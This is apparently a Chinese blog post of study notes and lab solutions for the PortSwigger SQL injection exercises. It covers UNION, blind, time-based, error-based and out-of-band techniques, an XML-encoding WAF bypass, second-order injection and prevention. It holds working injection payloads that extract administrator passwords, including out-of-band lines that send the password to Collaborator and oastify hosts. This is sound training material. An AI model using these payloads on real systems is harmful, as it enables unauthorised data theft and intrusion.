---
title: "Burp靶场：SQL注入"
subtitle: "Burp靶场：SQL注入"
summary: "记录学习和题解"
description: "记录学习和题解"
image: ""
date: 2025-11-21
lastmod: 2025-11-21
draft: false
toc:
 enable: true
hiddenFromHomePage: false
weight: false
categories: ["CTF"]
tags: ["Burp靶场"]
---

## 知识

### 注入点

可以通过对应用程序的**所有输入点**执行一套系统化测试，手动检测 SQL 注入漏洞。通常需提交以下内容：

1. 单引号字符 `'`，观察是否出现错误或其他异常；
2. 特定 SQL 语法（其计算结果分别等于输入点的原始值和不同值），观察应用程序响应是否存在规律性差异；
3. 布尔条件（如 `OR 1=1`、`OR 1=2`），观察应用程序响应差异；
4. 用于在 SQL 查询执行时触发延时的负载，观察响应时间是否存在差异；
5. 用于在 SQL 查询执行时触发带外网络交互的 OAST（带外应用安全测试） 负载，并监控是否产生相关交互。

此外，也可以使用 Burp Scanner 快速、可靠地发现绝大多数 SQL 注入漏洞。

### UNION 攻击

当应用程序存在SQL注入漏洞，且查询结果会返回到应用响应中时，可利用 `UNION` 关键字从数据库的**其他表**中获取数据。这种攻击方式通常被称为 **SQL注入UNION攻击**。

`UNION` 关键字允许执行一个或多个额外的 `SELECT` 查询，并将结果附加到原始查询中。例如：

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

该SQL查询会返回一个包含两列的结果集，数据涵盖 `table1` 表的 `a`、`b` 列和 `table2` 表的 `c`、`d` 列。

要让 UNION 查询生效，必须满足两个关键条件：

1. 各个查询必须返回**相同数量的列**；
2. 各个查询对应列的数据类型必须**兼容**。

实施 SQL 注入 UNION 攻击时，需确保攻击手段符合这两个条件。这通常需要查明以下两点：

1. 原始查询返回的列数是多少；
2. 原始查询返回的列中，哪些列的数据类型适合承载注入查询的结果。

#### 判断列数

在实施SQL注入UNION攻击时，有两种有效方法可确定原始查询返回的列数。

其中一种方法是注入一系列`ORDER BY`子句，并逐步增加指定的列索引，直至触发错误。例如，若注入点位于原始查询`WHERE`子句内的带引号字符串中，你需要提交以下负载：
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
……
```
这一系列负载会修改原始查询，使其按结果集中的不同列对结果排序。`ORDER BY`子句中的列可通过索引指定，因此无需知晓任何列名。当指定的列索引超过结果集中的实际列数时，数据库会返回错误，例如：
> ORDER BY位置编号3超出了选择列表中的项目数量。

应用程序可能会在HTTP响应中直接返回数据库错误，也可能返回通用的错误响应，甚至可能仅返回空结果。无论哪种情况，只要能检测到**响应中的差异**，就能推断出查询返回的列数。

第二种方法是提交一系列`UNION SELECT`负载，其中包含数量不同的空值（`NULL`）：
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
……
```
若空值的数量与列数不匹配，数据库会返回错误。

我们将注入的`SELECT`查询的返回值设为`NULL`，原因是原始查询与注入查询的对应列必须数据类型兼容。而`NULL`可**转换为所有常见的数据类型**，因此当列数正确时，能最大程度提高负载的执行成功率。

#### 寻找数据类型可用的列
SQL注入UNION攻击能让你获取注入查询的结果，而你想要提取的关键数据通常是以字符串形式存储的。这意味着，你需要在原始查询的结果中，找到一列或多列**数据类型为字符串，或与字符串数据兼容**的列。

在确定所需的列数后，你可以逐个探测每一列，测试其是否能存储字符串数据。你需要提交一系列`UNION SELECT`负载，依次在每一列中放入一个字符串值。例如，若查询返回四列，你应提交以下负载：
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

如果目标列的数据类型与字符串不兼容，注入的查询会触发数据库错误。

若未出现错误，且应用程序的响应中包含了额外内容（其中包含注入的字符串值），则说明该列适合用于提取字符串数据。

#### 漏洞利用

当你确定了原始查询返回的列数，并找到可存储字符串数据的列后，就可以着手获取关键数据了。

假设存在以下条件：

1. 原始查询返回两列，且这两列均支持存储字符串数据；
2. 注入点位于`WHERE`子句内的带引号字符串中；
3. 数据库中存在一个名为`users`的表，包含`username`（用户名）和`password`（密码）两列。

在这个示例中，你可以提交如下输入，获取`users`表中的数据：

```sql
' UNION SELECT username, password FROM users--
```

要实施此类攻击，你**需要预先知晓**数据库中存在`users`表，且该表包含`username`和`password`列。若缺乏这些信息，就需要猜测表名和列名。不过，所有现代数据库都提供了查看数据库结构的方法，可通过这些方法确定其中包含的表和列。

##### 合并字符串

有时候，不会所有列都返回或显示，这时候就需要将字符串合并起来，具体需要看是什么数据库。

例如在 Oracle 数据库中，可提交如下输入：

```sql
' UNION SELECT username || '~' || password FROM users--
```

这里使用的双竖线`||`是 Oracle 的字符串拼接运算符。注入的查询会将`username`和`password`字段的值拼接在一起，并以`~`字符作为分隔。

### 不同数据库的差异

详见：[SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)

对注释、查询等，不同的数据库会有不同的特定行为，需要根据需要更改。主要类型有：Oracle、Microsoft、PostgreSQL、MySQL

### 数据库信息查询

通过注入不同数据库厂商专属的查询语句，根据语句是否执行成功，来确定数据库的**类型**和**版本**。

以下是用于查询几款主流数据库版本的语句：

| 数据库类型             | 查询语句                |
| ---------------------- | ----------------------- |
| 微软 SQL Server、MySQL | SELECT @@version        |
| Oracle                 | SELECT * FROM v$version |
| PostgreSQL             | SELECT version()        |

#### 列出数据库中的内容

多数数据库类型（Oracle 除外）都包含一组名为 **信息模式（information schema** 的视图，这组视图会提供数据库的相关元数据信息。

> Oracle 不使用`information_schema`，而是通过内置系统表（如`all_tables`查看表名、`all_tab_columns`查看列信息）来获取元数据。

例如，你可以查询`information_schema.tables`来列出数据库中的所有表：

```sql
SELECT * FROM information_schema.tables
```

该查询会返回类似如下的结果：

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ---------- |
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |

上述结果表明数据库中有三张表，分别为`Products`、`Users`和`Feedback`。

随后，你可以查询`information_schema.columns`来列出单个表中的列信息：

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

该查询会返回类似如下的结果：

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
| ------------- | ------------ | ---------- | ----------- | --------- |
| MyDatabase    | dbo          | Users      | UserId      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |

### 盲注

当应用程序存在 SQL 注入漏洞，但 HTTP 响应中**不包含相关 SQL 查询的结果**，也**不显示任何数据库错误详情**时，就会发生盲注。

许多注入技术（如 UNION 攻击）在盲注漏洞中无法奏效，这是因为这些技术的核心依赖是能在应用响应中看到注入查询的执行结果。不过，攻击者仍可利用盲注获取未授权数据，只是需要使用不同的技术手段。

#### 布尔

什么技术手段呢？一个例子是，根据返回的内容进行判断，例如分别注入：

```sql
…xyz' AND '1'='1
…xyz' AND '1'='2
```

观察返回的结果，如果两个例子返回的不同，就可以根据返回结果来判断查询是否是有效的，我们能做的就很多了。你可以通过发送一系列输入，**逐字符测试密码**，最终确定某项数据。

操作步骤如下：

1. 首先发送以下输入：

   ```plaintext
   xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
   ```

   若返回成功，说明注入的条件为真，即密码的第一个字符大于 `m`。

2. 接着发送以下输入：

   ```plaintext
   xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
   ```

   若未返回成功，说明注入的条件为假，即密码的第一个字符不大于 `t`。

3. 最终发送以下输入，若返回成功，则可确认密码的第一个字符为 `s`：

   ```plaintext
   xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
   ```

重复上述过程，即可系统性地推断出 `Administrator` 用户的完整密码。

> SUBSTRING(查询的字符串，起始位置，截取几个字符)，在有些数据库里，又叫做 SUBSTR

#### 条件

报错型 SQL 注入指的是：即便在盲注场景下，你仍可利用数据库返回的**错误信息**，直接提取或推断数据库中的敏感数据。与布尔盲注的差别主要是,报错盲注会返回具体的**报错信息**可供利用，或者只检查语句本身是否合法，而不检查语句是否为真。

要理解这种技术的工作方式，假设依次发送两个请求，请求中包含的`TrackingId` Cookie值分别为：
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
这些输入利用`CASE`关键字测试条件，并根据条件是否成立返回不同的表达式，具体逻辑如下：
- 第一个输入中，`CASE`表达式的结果为`'a'`，不会触发任何数据库错误；
- 第二个输入中，`CASE`表达式的结果为`1/0`（零除运算），会触发**除零错误**。

如果该错误会导致应用的HTTP响应产生可识别的差异（如返回500错误页、弹出提示信息），你就可以借此判断注入的条件是否成立。

借助这种技术，你可以通过**逐字符测试**的方式提取数据库中的数据，例如：
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

### 
### 

典型错误：

1. **类型转换错误**：例如在数值列中注入字符串，仅当条件为真时执行该转换（如`AND (IF(1=1, CAST('a' AS INT), 0))`）；
2. **子查询语法错误**：构造仅在条件为真时返回多行的子查询，触发 “单行子查询返回多行” 错误；
3. **函数调用错误**：调用数据库内置函数时传入非法参数，仅在条件为真时触发函数执行错误。

#### 报错

由于数据库**配置不当**，有时会输出错误信息，在某些情况下，你甚至可以诱导应用生成**包含查询结果数据**的错误信息。这一手段能将原本的盲注漏洞，转化为可直接查看数据的 “显错注入”，大幅降低攻击难度。

你可以使用`CAST()`函数实现这一目的，该函数的作用是将一种数据类型转换为另一种。例如，构造包含如下语句的查询：

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

通常，你试图读取的目标数据是字符串类型，而将字符串强制转换为不兼容的类型（如整数`int`）时，数据库会抛出类似如下的错误：

> ERROR: invalid input syntax for type integer: "Example data"

值得注意的是，若目标应用存在字符长度限制，导致你无法通过常规的条件响应方式进行盲注时，这种利用类型转换错误提取数据的方法会尤为有效。

#### 时间

若应用在SQL查询执行时捕获数据库错误并优雅处理，其响应不会出现任何差异——这意味着前文所述的条件错误注入技术将失效。

这种情况下，可通过**根据注入条件的真假触发不同时间延迟**来利用盲注漏洞。由于应用通常会同步处理SQL查询，延迟SQL执行会导致HTTP响应同步延迟，因此可通过接收响应的耗时判断注入条件的真假。

触发时间延迟的技术因数据库类型而异。例如在Microsoft SQL Server中，可通过以下语句测试条件并根据结果触发延迟：
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
- 第一条输入不触发延迟（条件1=2为假）；
- 第二条输入触发10秒延迟（条件1=1为真）。

借助该技术可逐字符提取数据，示例如下：
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

SQL查询中触发时间延迟的方式多样，不同数据库适用不同技术，详情可参考SQL注入速查表。

#### 带外

某些应用可能会以**异步方式**执行与之前示例相同的SQL查询：应用在原线程中继续处理用户请求，同时**用另一个线程**执行包含Tracking Cookie的SQL查询。此时查询仍存在SQL注入漏洞，但此前介绍的所有技术都将失效——因为应用的响应不依赖于查询返回的数据、数据库错误，也不依赖于查询的执行时间。

这种情况下，通常可以通过**触发向你控制的系统发起带外网络交互**来利用盲注漏洞。你可以基于注入的条件触发这类交互，从而逐段推断信息；更实用的是，还能直接**通过网络交互泄露数据**。

多种网络协议都可用于此目的，但最有效的通常是DNS（域名系统）——许多生产网络允许**DNS查询自由出站**，因为这是生产系统正常运行的必要条件。

使用带外技术最简单可靠的工具是**Burp Collaborator**：这是一个提供多种网络服务（包括DNS）自定义实现的服务器，能让你检测发送单个载荷后是否触发了网络交互。Burp Suite专业版内置了客户端，默认已配置好与Burp Collaborator的协作。更多信息可参考Burp Collaborator的文档。

触发DNS查询的技术因数据库类型而异。例如，在Microsoft SQL Server中，以下输入可导致数据库对指定域名发起DNS查询：
```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
> `exec master..xp_dirtree`调用系统存储过程，传入的参数是一个**网络共享 UNC 路径**（`//域名/a`）

这会让数据库查询以下域名：
```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```
子域名外带：

```sql
'; exec master..xp_dirtree '//' + (SELECT password FROM users WHERE username='administrator') + '.0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
或者多语句结合
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

你可以用Burp Collaborator生成唯一的子域名，然后轮询Collaborator服务器，确认DNS查询是否发生。

### 其他环境下的 SQL 注入

实际上，只要应用会将你可控制的输入作为SQL查询处理，任何这类输入都能用于实施SQL注入攻击。例如，部分网站会接收JSON或XML格式的输入，并利用这些输入查询数据库。

这些不同的格式能为你提供多种**混淆攻击的方法**，以绕过原本会被WAF（Web应用防火墙）及其他防御机制拦截的攻击。许多防御机制的实现较为薄弱，仅通过在请求中搜索常见的SQL注入关键字（如`SELECT`、`UNION`）进行拦截，因此你可以通过对禁用关键字中的字符进行**编码或转义**，绕过这类过滤。例如，以下基于XML的SQL注入就使用了XML转义序列对`SELECT`中的`S`字符进行编码：

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

该转义字符会在**服务器端被解码**后，再传递给SQL解释器执行。

### 二阶注入

**一阶SQL注入**指应用程序处理HTTP请求中的用户输入时，以不安全的方式将输入直接拼接到SQL查询中，导致漏洞触发。

**二阶SQL注入**则是指应用程序先接收HTTP请求中的用户输入并存储（通常存入数据库），但数据存储阶段并不存在漏洞；后续处理另一个HTTP请求时，应用程序**从存储中读取该数据**，却以不安全的方式将其拼接到SQL查询中，最终触发注入。因此，二阶SQL注入也被称为**存储型SQL注入**（stored SQL injection）。

二阶SQL注入的典型场景是：开发者已知一阶注入的风险，因此在数据**首次存储**时做了安全处理（如转义、参数化查询）；但后续读取该数据时，错误地认为“已存入数据库的数据是安全可信的”，未做任何安全校验就直接用于SQL查询，最终因这种“信任误用”导致漏洞。

典型场景示例

1. **用户注册场景**： 
   注册时输入用户名 `admin'--`，应用程序用参数化查询将其安全存入数据库（存储内容为 `admin'--`）；
2. **后台用户查询场景**： 
   管理员在后台查询用户信息时，应用程序读取数据库中的用户名，以不安全方式拼接SQL：  
   
   ```sql
   SELECT * FROM users WHERE username = '$stored_username';
   ```
   拼接后实际执行的SQL为：  
   ```sql
   SELECT * FROM users WHERE username = 'admin'--';
   ```
   注释符 `--` 导致后续语句被忽略，实现越权查询。

### 防范注入

**核心方案：参数化查询（预处理语句）**
用占位符`?`替代直接字符串拼接，将SQL查询结构与用户输入数据彻底分离，数据库会自动转义特殊字符，从根源杜绝注入。这是处理**数据层面输入**（WHERE条件、INSERT/UPDATE值）的最优解。

**局限性与替代方案**
参数化查询无法用于SQL**结构层面**（表名、列名、ORDER BY子句）。此类场景需：

- 白名单校验：仅允许预设的合法值；
- 逻辑重构：通过业务逻辑绕开用户输入直接参与SQL结构。

**关键原则**
- 硬编码SQL常量：参数化查询的SQL语句必须是固定常量，不包含任何变量；
- 拒绝主观信任：无论数据来源（用户输入、数据库存储数据），均不直接拼接，避免二阶注入等风险；
- 禁用选择性拼接：不凭经验判断“数据是否安全”，彻底杜绝字符串拼接的使用。

## Labs 题解

### Union 攻击

#### 常规

注入点：`/filter?category=Corporate+gifts`

题目要求用 NULL 查询，所以闭合引号后，逐步添加 NULL 即可。payload `'+UNION+SELECT+NULL,NULL,NULL--`

#### 找可用列

注入点：`/filter?category=Clothing%2c+shoes+and+accessories`

先出列数 `'+ORDER+BY+3--`

题目说 `Make the database retrieve the string: 'iIwJ8H'` 所以用 `'iIwJ8H'` 逐个替换 NULL 查询即可。

> 感觉有点奇怪的判断……

#### 拼接字符串

注入点：`/filter?category=Gifts`

先判断列数：发现只有两列，而且只有一列是 string：`'+UNION+SELECT+NULL,'abc'--`,所以得考虑将 username 和 password 拼接起来

payload：`'+UNION+SELECT++NULL,username||'~'||password+FROM+users--`

### 数据库查询

#### 普通查询

注入点：`/filter?category=Gifts`

先判断列数：发现 `'UNION+SELECT+NULL,NULL--` 不管多少都查询错误，考虑可能是数据库不一样，换成了 `'UNION+SELECT+NULL,NULL#--` ，查询成功，然后查询指定列即可。

#### 查表、列名

注入点：`/filter?category=Gifts`

先判断列数：`'+ORDER+BY+2` 两列

1.查表名，这里出了问题。一开始的查询：`'+UNION+SELECT+*,+NULL+FROM+information_schema.tables--`，如果用通配符的话，会导致列数的不匹配！需要直接指定列名：`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`，发现特殊表 `users_inatpk`

2.查列名，`'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_inatpk'`,查询 information_schema.columns 表，需要指定对应的表名，否则结果很多，发现列名 `password_xzxkya` `username_rxlzlc`

3.查数据，`'+UNION+SELECT+username_rxlzlc,password_xzxkya+FROM+users_inatpk--`

### 盲注

#### 布尔盲注

1.注入点：`Cookie: TrackingId=ZVcenZbEGyKbb2Nc`，用 `' and '1' ='1` 来判断一下是否存在布尔盲注，发现查询成功的话会返回 `Welcome` 字段。

2.检验：`' AND (SELECT 'a' FROM users WHERE username='administrator')='a` 来判断 users 表是否存在。这里的思路是 select 出一个恒等的字符串来验证，后面方便拼接进语句。

3.查长度：`' AND (SELECT 'a' FROM users WHERE username='administrator' and length(password)>1)='a` 确定存在，然后 `' AND (SELECT 'a' FROM users WHERE username='administrator' and length(password)=20)='a` 确定有 20 位

4.查各个位数：手动查显然太麻烦了，这里用 Burp 的 Intruder 可以半自动查询。语句为` ' and (select substring(password,1,1) from users where username='administrator') = 'a`,把最后的 a 设为爆破点，然后手动调整 (password,num,1) 进行爆破。

5.记录：birxocztgrtwf7ugbhw3

#### 条件盲注

1.判断注入点：`Cookie: TrackingId=y0chXfk5EGo4lz1o`，`'` 报错，`''` 不报错，从而确定是 SQL 语法报错注入。

2.判断数据库类型：`'||(SELECT '')||'` 报错，`'||(SELECT '' FROM dual)||'` 不报错，从而判断是 Oracle

3.验证目标表存在：`'||(SELECT '' FROM not-a-real-table)||'` 报错，`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'` 不报错

> 这里用 ROENUM 类似 limit，为的是方式返回多行结果
>
> 总体思路就是通过字符串拼接来测试报错

4.条件判断可行性：`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` 不报错，而改成 `1=2` 报错（除零），故可行。

5.出长度：`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` 

6.出密码：`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` 和前面一样，Intruder 枚举 `a`，手动改第一个 1 即可

> 用 cluster bomb 更简单。sqlmap 不会用。
>
> 技巧是全部扫完后，多选 - 高亮指定length - 排序。

#### 报错信息泄露

1.注入点：`Cookie: TrackingId=B8kZGghEST0pmL5o`，加一个`'`，发现报错：`Unterminated string literal started at position`，考虑信息泄露

2.测试报错：`' and cast((select 1) as int)--`,报错`ERROR: argument of AND must be type boolean, not type integer`，验证。`' AND 1=CAST((SELECT 1) AS int)--`，不报错，是可以用的。`' AND 1=CAST((SELECT username FROM users) AS int)--` 但是这样子又变成了最开始的报错，考虑是**输入被截断**了！！

3.解决截断：`' AND 1=CAST((SELECT username FROM users) AS int)--`，报错变成`ERROR: more than one row returned by a subquery used as an expression`，再改成 `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`,报错`ERROR: invalid input syntax for type integer: "administrator"`，成功出用户名！

4.出密码：`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

#### 时间盲注

1.注入点判断：`Cookie: TrackingId=x`,添加`'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`，对比`'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` 发现延时，有时间盲注。这里的 `%3B` 是分号，防止 burp 识别成两个参数。

> **`pg_sleep(n)`的函数类型**：`pg_sleep`是 PostgreSQL 的 **“延迟函数”**，返回值类型为`void`（无返回值），它的作用是**暂停当前数据库会话的执行 **，仅能在`SELECT`语句的**选择列表**（`SELECT 列/函数`）中执行，**无法作为`WHERE`子句的条件表达式**。

2.验证条件：`'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

3.出长度：`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

4.出密码：`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

> Intruder 里爆破，为了保证有效性，需要在 Resource Pool 里把线程数调整为 1，这样会串行发送请求（否则会同时发送n个，导致共同阻塞）。同时，看结果是需要开启顶栏 - columns - Response Received
>
> Cluster Bomp用不了，只能手动调整数字，然后爆破字母，可以用多线程。

#### 带外盲注

1.注入点：`Cookie: TrackingId=VKVwX08YULpCF0yM`

2.尝试带外：`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://255pds2evbd16n9qqk51tr8fu60xoncc.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--`

> payload讲解：
>
> 该语句的关键是**利用 Oracle 的 XML 外部实体注入（XXE）特性触发带外 HTTP 请求**，流程如下
>
> 1. **闭合并拼接联合查询**：通过单引号`'`闭合原始 SQL 的字符串，再用`UNION SELECT`拼接恶意查询，确保整体 SQL 语法合法。
> 2. **构造 XML 类型数据**：`xmltype(...)`将包含外部实体的 XML 字符串转换为 **Oracle 可解析**的 XML 对象。
> 3. 解析外部实体触发带外请求：
>    - 当 Oracle 解析 XML 中的`%remote;`实体时，会根据`SYSTEM`指定的`http://BURP-COLLABORATOR-SUBDOMAIN/`发起**HTTP 请求**；
>    - 即使该 HTTP 请求无返回数据，Burp Collaborator 服务器也能捕获到这个请求，证明注入语句被执行。
> 4. **补全语法并执行**：`EXTRACTVALUE`和`FROM dual`补全 Oracle 的查询语法，让整个语句顺利执行，无语法错误。
>
> 在 Oracle 数据库的带外注入中，**无法直接通过常规 SQL 语法发起 HTTP 请求**，必须借助 XML 相关函数（如`xmltype`+`EXTRACTVALUE`）间接实现，核心原因是**Oracle 本身没有内置的原生 HTTP 请求函数**

plus

payload:

```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

然后看子域名即可

### 其他场景的注入

#### XML 编码绕过 WAF

1.注入点：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>2</productId>
    <storeId>1</storeId>
</stockCheck>
```

2.测试：改为 `1 union select null` ，发现被检查出攻击了，有 waf。将内容进行 html 实体编码，发现绕过了。再测试，发现只能返回一行，所以需要拼接字符串。

3.payload：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>2</productId>
    <storeId>1 UNION SELECT username || '~' || password FROM users</storeId>
</stockCheck>
```

把`1 UNION SELECT username || '~' || password FROM users` 编码为`&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#126;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;`